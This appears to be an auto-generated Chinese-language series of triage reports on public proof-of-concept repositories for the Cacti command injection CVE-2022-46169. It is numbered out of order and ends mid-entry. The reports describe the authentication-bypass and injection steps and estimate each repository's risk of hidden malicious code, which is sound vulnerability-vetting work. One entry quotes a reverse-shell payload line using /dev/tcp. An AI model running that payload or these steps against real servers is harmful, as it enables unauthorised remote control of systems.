**有效性分析：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用过程如下：

1.  **身份验证绕过：** 通过设置 `X-Forwarded-For` HTTP Header 为 `127.0.0.1` 来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器的 IP 地址，从而绕过身份验证检查。
2.  **寻找有效的 `host_id` 和 `local_data_ids[]`：** 漏洞利用代码使用暴力破解的方式查找具有 `POLLER_ACTION_SCRIPT_PHP` 动作类型的 `poller_item` 所对应的 `host_id` 和 `local_data_ids[]`。  这是必要的，因为需要一个特定的配置才能触发命令注入点。
3.  **命令注入：** 构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。由于 `poller_id` 参数未经过滤，恶意命令会被注入到 `proc_open` 函数中执行。

参考搜索引擎结果，已经有公开的利用该漏洞的报告和利用代码，表明该漏洞是可利用的。

**投毒风险分析：**

代码本身的主要功能是利用 CVE-2022-46169 漏洞进行命令注入，实现远程代码执行。仔细审查代码，并未发现明显的恶意行为，例如上传恶意文件、篡改系统配置等。但是，任何从互联网上下载的代码都存在潜在风险，因此仍需谨慎使用。

以下是一些潜在的投毒风险和缓解措施：

*   **依赖项风险：** 代码中使用了 `requests` 和 `urllib.parse` 库。虽然这些库本身是安全的，但如果通过 `pip` 安装时，存在被中间人攻击替换为恶意库的风险。 建议从官方源安装依赖项，并验证其完整性。
*   **Payload 风险：** 攻击者可以构造恶意的命令，对目标系统造成破坏。例如，删除关键文件、停止服务等。用户在使用时需要谨慎，避免执行不信任的命令。
*   **隐蔽后门：** 作者可能在代码中添加一些不明显的后门，例如，将执行结果发送到远程服务器，或在系统上创建一个隐藏的账户。 尽管当前代码未发现此类行为，但仍需保持警惕。

综合考虑，认为该代码存在较低的投毒风险，约为 5%。 主要风险来自于使用者自身对命令的控制不当，以及作者可能加入不易察觉的隐蔽后门代码的可能性。使用前应仔细审查代码，并进行安全测试。

**漏洞利用方式：**

1.  攻击者发送带有特制 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式，找到有效的 `host_id` 和 `local_data_ids[]`，它们对应于一个配置为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。
3.  攻击者构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。
4.  服务器执行恶意命令，攻击者获得对服务器的控制权。

**项目地址:** [r1nzleer/RCE-Cacti-1.2.22](https://github.com/r1nzleer/RCE-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #29

**来源**: [CVE-2022-46169-ruycr4ft_CVE-2022-46169.md](../2022/CVE-2022-46169-ruycr4ft_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统上存在具有`POLLER_ACTION_SCRIPT_PHP` action类型的poller_item配置，并且能够通过伪造HTTP头绕过身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是一个存在于Cacti 1.2.23之前版本中的未经身份验证的命令注入漏洞。该漏洞存在于`remote_agent.php`文件中。攻击者可以通过伪造`X-Forwarded-For`等HTTP头来绕过身份验证，利用`get_client_addr`函数的缺陷，使其返回运行Cacti服务器的IP地址。然后，通过`polldata` action，攻击者可以控制`poller_id`参数，由于该参数未经过滤就被传递给`proc_open`函数执行，从而导致命令注入。PoC代码首先检查目标是否易受攻击，然后通过暴力破解`host_id`和`local_data_ids`来找到具有`POLLER_ACTION_SCRIPT_PHP` action的`poller_item`。 找到有效的`host_id`和`local_data_ids`后，将构造包含恶意payload的URL并发送到目标系统。攻击者可以利用此漏洞在目标服务器上执行任意命令，例如下载恶意软件或窃取敏感数据。

**投毒风险分析：**

PoC代码主要功能是利用漏洞，但存在轻微的投毒风险：

1.  **Payload来源：** PoC代码要求用户输入IP地址和端口，然后生成反向shell的payload。如果用户不小心输入了错误的IP地址或端口，可能会导致连接到错误的服务器，或者暴露自己的IP地址。
2.  **依赖外部资源：** PoC依赖于`requests`和`urllib.parse`库，这些库可能存在安全问题或被篡改，但可能性较低。
3.  **Payload执行环境：** 生成的payload在目标服务器上执行，如果目标服务器的安全配置不当，可能会被恶意利用。
4.  **代码可读性：** 代码相对清晰，没有明显的恶意行为，但仍然需要仔细审查。

总体来说，PoC代码的投毒风险较低，主要是由于用户输入和执行环境带来的风险。如果代码是从可信来源获取，并且用户仔细审查过代码，那么风险可以忽略不计。

**项目地址:** [ruycr4ft/CVE-2022-46169](https://github.com/ruycr4ft/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #30

**来源**: [CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md](../2022/CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在至少一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵`remote_agent.php`文件中的`poller_id`参数来执行任意操作系统命令。漏洞利用主要分为两个阶段：首先，通过设置`X-Forwarded-For`头绕过身份验证，伪造客户端IP地址，使其与Cacti服务器的IP地址匹配。然后，构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，最终导致命令注入。该POC代码通过循环尝试不同的`host_id`来发现可以利用的配置。POC代码没有发现明显的投毒行为，主要目的是利用漏洞执行命令。搜索引擎结果也表明该漏洞已被公开利用。

**项目地址:** [sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #31

**来源**: [CVE-2022-46169-yassinebk_CVE-2022-46169.md](../2022/CVE-2022-46169-yassinebk_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务运行且存在特定的数据源配置（poller_item具有POLLER_ACTION_SCRIPT_PHP action）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未授权命令注入漏洞。攻击者可以利用`remote_agent.php`文件中的授权绕过缺陷，通过伪造HTTP头（例如`X-Forwarded-For`），绕过IP地址验证，并利用`polldata`操作中的`poller_id`参数进行命令注入。

**漏洞利用方式：**

1.  **授权绕过：** 通过设置`X-Forwarded-For` HTTP头，模拟Cacti服务器自身的IP地址，绕过`remote_agent.php`的授权检查。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，攻击者可以控制这些变量。
2.  **ID爆破：** 爆破`host_id`和`local_data_id`参数，寻找一个`poller_item`记录，其`action`字段的值为`POLLER_ACTION_SCRIPT_PHP` (值为2)，表明该条目会执行PHP脚本。
3.  **命令注入：** 将恶意命令注入到`poller_id`参数中。由于`get_nfilter_request_var`函数没有充分过滤该参数，导致命令注入。
4.  **远程代码执行：** 通过`proc_open`函数执行注入的命令，从而实现远程代码执行。

**有效性分析：**

根据漏洞描述和提供的POC代码，该漏洞利用方式是有效的。POC代码首先检查目标是否存在漏洞，然后通过爆破`host_id`和`local_data_id`找到合适的`poller_item`记录，最后构造包含恶意命令的URL并发送请求，实现远程代码执行。

**投毒风险分析：**

分析提供的POC代码，没有发现明显的恶意代码或后门。脚本的功能集中于漏洞利用，没有其他可疑操作。因此，投毒风险评估为0%。

**项目地址:** [yassinebk/CVE-2022-46169](https://github.com/yassinebk/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---



---

## POC #8

**来源**: [CVE-2022-46169-MarkStrendin_CVE-2022-46169.md](../2022/CVE-2022-46169-MarkStrendin_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** Cacti服务器运行，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item，需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求绕过身份验证，并利用 `remote_agent.php` 文件中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者可以通过设置 `X-Forwarded-For` 或其他 `HTTP_` 开头的 HTTP Header，伪造客户端IP地址，使其与Cacti服务器自身的IP地址相同。`get_client_addr` 函数会读取这些header，然后 `gethostbyaddr` 函数将伪造的IP解析为主机名。由于 Cacti 的 `poller` 表中默认存在服务器自身的主机名记录，因此绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 参数的请求，并指定 `host_id`、`local_data_ids[]` 和 `poller_id`。其中，`poller_id` 参数没有经过充分的过滤，攻击者可以在 `poller_id` 中注入恶意命令。
3.  **寻找合适的poller_item：** 为了触发命令注入，需要存在一个 `poller_item`，其 `action` 字段的值为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，用于利用 CVE-2022-46169 漏洞。该脚本首先检查目标是否易受攻击，然后暴力破解 `host_id` 和 `local_data_id`，以便找到具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。 一旦找到，它会构造一个包含恶意负载的 HTTP 请求并发送到 `remote_agent.php`。

**投毒风险分析：**

该代码主要目的是发送payload以获得反向shell，并没有发现恶意修改或删除文件等高危操作。代码的功能基本符合描述，但仍然存在一些潜在风险。

*   **依赖风险：** 代码依赖 `requests` 库，如果 `requests` 库被恶意篡改，可能会导致安全问题。
*   **配置错误：** 攻击者可能会错误配置 `attacker_ip` 和 `attacker_port`，导致攻击失败或暴露自己的IP地址。

根据以上分析，该POC存在较低的投毒风险。 代码的主要功能是利用已知漏洞，没有发现额外的恶意代码或隐藏功能，但也不能完全排除攻击者在实际使用中进行修改以达到其他目的的可能性。 风险评估较低，约为5%。

**结论：**

该漏洞的利用较为直接，POC代码有效。 漏洞存在投毒风险，但风险较低。

**项目地址:** [MarkStrendin/CVE-2022-46169](https://github.com/MarkStrendin/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #9

**来源**: [CVE-2022-46169-N1arut_CVE-2022-46169_POC.md](../2022/CVE-2022-46169-N1arut_CVE-2022-46169_POC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #10

**来源**: [CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md](../2022/CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵`remote_agent.php`文件中的输入，利用`poller_id`参数执行任意操作系统命令。攻击流程如下：

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`头绕过身份验证。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，允许攻击者伪造客户端IP地址，从而通过`poller`表中的主机名检查。
2.  **触发命令注入：** 绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。`poll_for_data`函数检索请求参数并加载相应的`poller_item`条目。如果`poller_item`的`action`等于`POLLER_ACTION_SCRIPT_PHP`，则使用`proc_open`执行PHP脚本。`poller_id`参数在传递给`proc_open`之前未经过充分过滤，从而导致命令注入。
3.  **漏洞利用代码分析：**  `poc.sh` 脚本首先解析用户提供的参数（目标URL、本地IP和端口），然后构造反向shell的payload，并对其进行URL编码。脚本通过发送带有`X-Forwarded-For`头的HTTP请求来检查目标是否易受攻击。该脚本通过暴力破解`host_id`和`local_data_ids`来枚举有效的URL。最后，它使用构造的payload向目标发送一个请求，从而触发反向shell。
4.  **投毒风险评估：**  该POC的主要目的是利用漏洞实现反向Shell。检查`poc.sh`脚本，发现脚本本身主要功能是生成Payload、URL编码、发送HTTP请求。虽然存在修改反向连接IP和端口的可能性，但没有发现明显的恶意代码或后门。`README.md`中建议访问的GitHub仓库 (`https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application`)，用于搭建漏洞环境，**存在一定风险，应该注意**。总体而言，脚本投毒风险较低，初步评估为5%。风险主要来自于下载其他来源的poc，或者使用poc访问陌生的网址。
5.  **有效性评估:** 该POC的有效性较高，因为它可以自动化漏洞利用过程，从身份验证绕过到命令执行。多个搜索引擎结果表明该漏洞已被积极利用。
6.  **利用方式总结：** 通过伪造HTTP头绕过身份验证，然后利用未过滤的`poller_id`参数在`remote_agent.php`中注入命令，最终实现远程代码执行。

**项目地址:** [RdBBB3/SHELL-POC-CVE-2022-46169](https://github.com/RdBBB3/SHELL-POC-CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #11

**来源**: [CVE-2022-46169-Rickster5555_EH2-PoC.md](../2022/CVE-2022-46169-Rickster5555_EH2-PoC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响版本的Cacti，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中存在的一个命令注入漏洞，允许未经身份验证的攻击者在服务器上执行任意命令。漏洞存在于`remote_agent.php`文件中，由于对客户端IP地址的验证不严谨，攻击者可以通过设置`X-Forwarded-For`等HTTP头部绕过身份验证。绕过验证后，可以调用`polldata`动作，并利用`poller_id`参数的命令注入漏洞执行系统命令。

**利用方式：**

1.  攻击者发送带有恶意`X-Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含命令注入的`poller_id`参数的HTTP请求，发送到`remote_agent.php`，执行任意系统命令。 为了成功利用，必须存在一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP`（值为2）。

**POC有效性：**

提供的PoC代码通过发送带有特定HTTP头部的GET请求，利用`poller_id`参数执行命令注入。根据漏洞描述和PoC代码，该PoC是有效的，可以用于验证漏洞的存在。

**投毒风险：**

查看提供的文件，包括`README.md`、`cacti-CI-poc.py`、`docker-compose.yml`和`entrypoint.sh`。

*   `README.md`：包含漏洞描述、复现步骤和参考链接，没有发现恶意代码。
*   `cacti-CI-poc.py`：PoC脚本，用于发送HTTP请求触发命令注入，没有发现恶意代码，但利用时执行的命令完全由使用者控制，具有潜在风险。
*   `docker-compose.yml`：Docker Compose配置文件，用于构建包含漏洞版本的Cacti环境，没有发现恶意配置。
*   `entrypoint.sh`：Docker容器的入口脚本，用于初始化Cacti数据库和设置权限，没有发现明显的恶意代码，但其中`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"`语句禁用了管理员密码强制修改，这可能会降低安全性。

总体来说，该仓库的投毒风险较低，但入口脚本中禁用了管理员密码强制修改，存在潜在的安全风险。

投毒风险评估：5%。

**项目地址:** [Rickster5555/EH2-PoC](https://github.com/Rickster5555/EH2-PoC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #12

**来源**: [CVE-2022-46169-Safarchand_CVE-2022-46169.md](../2022/CVE-2022-46169-Safarchand_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个命令注入漏洞。攻击者可以通过构造`X-Forwarded-For`头绕过身份验证，然后利用`remote_agent.php`中的`polldata`操作注入恶意命令。该POC利用`X-Forwarded-For`头伪造客户端IP，绕过身份验证，然后通过`poller_id`参数向`proc_open`函数传递恶意payload，从而执行任意命令。POC尝试通过暴力破解`host_id`来找到一个可用的`poller_item`。代码中使用了`pexpect`来创建一个交互式的nc会话，以便接收反向shell。虽然使用了base64编码，但这是为了避免命令中的特殊字符导致问题，不是隐藏恶意代码，但是通过nc反弹shell存在被利用进行恶意操作的风险，因此存在一定的投毒风险，但是概率较低。整体而言，POC代码目的是为了验证漏洞存在，因此投毒概率较低，约为10%。

**漏洞利用方式：**

1.  **绕过认证：** 通过设置`X-Forwarded-For`头为Cacti服务器的IP地址，欺骗`get_client_addr`函数，绕过认证。
2.  **触发命令注入：**  向`remote_agent.php`发送包含`polldata` action的请求，并将恶意命令注入到`poller_id`参数中。  利用`proc_open`函数执行注入的命令。
3. **反弹shell:** 该poc通过反弹shell获得服务器控制权。

**项目地址:** [Safarchand/CVE-2022-46169](https://github.com/Safarchand/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #13

**来源**: [CVE-2022-46169-SystemVll_CVE-2022-46169.md](../2022/CVE-2022-46169-SystemVll_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头中的`Forwarded-For`字段，绕过身份验证，然后通过`remote_agent.php`文件中的`polldata`操作，并结合一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，将恶意命令注入到`proc_open`函数中执行，从而实现远程代码执行。

**漏洞利用方式:**
1.  **身份验证绕过:** 通过设置`Forwarded-For`等HTTP头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入:**  发送带有恶意`poller_id`参数的请求到`remote_agent.php?action=polldata`，该参数会被插入到`proc_open`函数执行的命令中。
3.  **寻找`POLLER_ACTION_SCRIPT_PHP`:**  漏洞利用的前提是存在一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。需要找到对应的`host_id`和`local_data_id`。

**有效性:**
根据漏洞描述，此漏洞利用代码利用了未经授权的远程代理来执行任意系统命令，因此有效。

**投毒风险:**
提供的代码段是 Apache 2.0 许可协议，不包含任何可执行代码或恶意代码，因此投毒风险为0%。核心的PoC代码并没有提供，因此无法判断攻击者是否进行了后门代码验证，只能判断提供的许可协议不存在投毒风险。

**项目地址:** [SystemVll/CVE-2022-46169](https://github.com/SystemVll/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #14

**来源**: [CVE-2022-46169-a1665454764_CVE-2022-46169.md](../2022/CVE-2022-46169-a1665454764_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行Cacti，并且存在具有 'POLLER_ACTION_SCRIPT_PHP' action类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经验证的远程命令执行漏洞。攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并在目标系统上执行任意命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`等HTTP Header, 伪造客户端 IP 地址，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以通过 `polldata` action，并控制 `poller_id` 参数，将恶意命令注入到 `proc_open` 函数的参数中，从而执行任意系统命令。
3.  **前提条件：** 漏洞利用需要存在一个 `poller_item`，其 `action` 字段设置为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。默认安装的Cacti，很可能存在满足此条件的`poller_item`。
4.  **POC有效性:** 提供的POC代码有效, 利用`remote_agent.php`，设置`X-Forwarded-For` header，构造包含恶意命令的URL,发送请求来执行命令。
5. **投毒风险:** README.md 为漏洞复现步骤，以及github仓库的使用方式说明。POC代码本身除了写入output.txt之外没有发现其他恶意行为。虽然存在一定的风险，例如该代码可能被恶意修改后传播，但当前提供的代码投毒概率较低，大约为1%。该POC的主要功能是检测漏洞是否存在并执行命令，而不是植入后门。

**项目地址:** [a1665454764/CVE-2022-46169](https://github.com/a1665454764/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #15

**来源**: [CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md](../2022/CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务可网络访问, 并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，然后利用`polldata`动作，通过构造恶意的`poller_id`参数，执行任意操作系统命令。漏洞利用的关键在于：

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证检查。这是因为`get_client_addr`函数会信任`HTTP_`开头的`$_SERVER`变量，导致可以伪造IP地址。
2.  **命令注入：** 一旦通过身份验证，攻击者可以向`remote_agent.php`发送带有`action=polldata`的请求，其中`poller_id`参数可以被注入恶意命令。程序会将这个参数传递给`proc_open`函数，从而执行攻击者提供的命令。
3.  **利用方式：**  提供的Python脚本首先检查目标是否易受攻击，然后使用提供的LHOST和LPORT生成反向shell有效负载。 脚本通过暴力破解`host_id`和`local_data_ids[]`，构造恶意的URL，发送到目标`remote_agent.php`，从而执行反向shell，从而在目标系统上获得shell访问权限。

**投毒风险分析：**

代码本身主要功能是实现漏洞利用，但仍然存在一定低概率的投毒风险：

*   **潜在的后门：** 虽然代码的主要目的是利用漏洞，但作者可能在payload构建过程中插入了额外的恶意代码，例如，在反向shell payload中添加了额外的命令，用于收集敏感信息或执行其他恶意操作。但是从代码来看，payload是根据用户输入的IP和端口构建的，自定义程度较高，因此payload中存在后门的概率较低。
*   **依赖风险：** 该脚本依赖于`requests`和`urllib`库。虽然这些都是常用的库，但如果这些库本身存在漏洞，或者作者使用了不安全的库函数，可能会引入安全风险。

总体而言，该POC代码的投毒风险较低，约为5%。主要风险在于payload构建过程中可能存在的隐蔽后门，以及对第三方库的依赖。

**项目地址:** [alv-david/CVE-2022-46169-Cacti-1.2.22](https://github.com/alv-david/CVE-2022-46169-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #16

**来源**: [CVE-2022-46169-antisecc_CVE-2022-46169.md](../2022/CVE-2022-46169-antisecc_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在`poller_item`记录，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (2)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中。攻击者可以通过设置 `X-Forwarded-For` HTTP 头绕过身份验证，然后利用 `polldata` 操作，将恶意命令注入到 `poller_id` 参数中，导致服务器执行任意命令。  

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用的**有效性高**。漏洞库和搜索引擎结果都确认了该漏洞的存在和严重性，并且已经有公开的漏洞利用代码可用。提供的 Python 脚本 `CVE-2022-46169.py` 实现了漏洞利用过程，包括绕过身份验证和注入命令。  

**投毒风险分析：**

对提供的 Python 脚本进行分析，该脚本的主要功能是利用 CVE-2022-46169 漏洞，不存在明显的恶意代码或后门。但是，任何利用代码都存在被修改的风险，攻击者可能会在代码中添加恶意功能。考虑到代码量较少，逻辑清晰，用户可以容易地进行审查，因此，**投毒风险较低，估计为5%**。这个风险主要来自使用者没有进行代码审计就直接使用，例如添加反弹shell等恶意操作。

**利用方式：**

1.  **身份验证绕过：** 攻击者发送带有 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，伪造客户端 IP 地址，绕过身份验证。
2.  **命令注入：** 攻击者构造包含恶意命令的 `poller_id` 参数，通过 `polldata` 操作传递给 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器在处理 `polldata` 操作时，会将 `poller_id` 参数中的恶意命令注入到 `proc_open` 函数中，导致服务器执行任意命令。

**POC利用方式详细过程:**

1.  运行 `CVE-2022-46169.py` 脚本，指定目标 Cacti 实例的 URL 和要执行的命令。
2.  脚本会遍历一系列 `host_id`，并为每个 `host_id` 构建一个包含恶意 `poller_id` 参数的 HTTP GET 请求。
